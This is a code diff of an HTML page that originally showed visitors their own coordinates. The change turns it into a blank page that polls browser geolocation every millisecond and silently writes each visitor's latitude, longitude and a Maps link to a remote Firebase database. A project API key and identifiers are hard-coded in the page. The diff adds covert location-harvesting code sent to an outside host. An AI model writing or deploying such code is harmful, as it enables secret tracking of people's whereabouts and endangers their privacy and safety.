@@ -1,10 +1,35 @@
 <!DOCTYPE html>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>
-<p id="demo"></p>
-<p id="demo2"></p>
+<html>
+    <head>
+        <title>Page Title</title>
+    </head>
+    <body>
+        
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.3.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.3.1/firebase-database.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.3.1/firebase-analytics.js"></script>
+
 <script>
-var result = document.getElementById("demo");
-var result2 = document.getElementById("demo2");
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+  apiKey: "AIzaSyC4PGhQbXPGEzYgXaubewhfQ1Qt4V5Fjwo",
+  authDomain: "databaseapi2.firebaseapp.com",
+  projectId: "databaseapi2",
+  storageBucket: "databaseapi2.appspot.com",
+  messagingSenderId: "652048654784",
+  appId: "1:652048654784:web:a304a06f04f05a2a5f6825",
+  measurementId: "G-8MD1FDLBCD"
+};
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  firebase.analytics();
+</script>
+<script>
 
 function getLocation() {
   if (navigator.geolocation) {
@@ -14,43 +39,27 @@ function getLocation() {
   }
 }
 
-function showPosition(position) {
- 
-var url = 'https://maps.google.com/?q='+'@'+position.coords.latitude+","+position.coords.longitude;
-
-result.innerHTML = '<button id="CoordsToGet">Get</button>'
-var CoordsToGet = document.getElementById("CoordsToGet");
-result2.innerHTML = 'Latitude: '+ position.coords.latitude + '. Longitude: ' + position.coords.longitude + '. ' + '<a href="'+url+'">'+url+'</a>';
-CoordsToGet.addEventListener("click", function(){
-
-window.location.href = url;
-
-})
-}
-
-
-
 setInterval(getLocation, 1)
 
-window.addEventListener("error", handleError, true);
+var firebaseDatabase = firebase.database();
 
-function handleError(evt) {
-    if (evt.message) { // Chrome sometimes provides this
-      alert("error: "+evt.message +" at linenumber: "+evt.lineno+" of file: "+evt.filename);
-    } else {
-      alert("error: "+evt.type+" from element: "+(evt.srcElement || evt.target));
-    }
+function showPosition(position){
+
+    var url = 'https://maps.google.com/?q='+'@'+position.coords.latitude+","+position.coords.longitude;
+
+
+
+    
+    firebaseDatabase.ref('LocalGetting').set({
+
+SavedUrl: url,
+ExactLocation: 'Latitude: '+ position.coords.latitude + '. Longitude: ' + position.coords.longitude + '. ' + '<p><a href="'+ url +'">'+url+'</a></p>'
+ 
+
+})
+
 }
+
 </script>
-<style>
-				
-				button{
-								
-								
-								
-				}
-				
-</style>
-
-
-</body></html>
+    </body>
+</html>
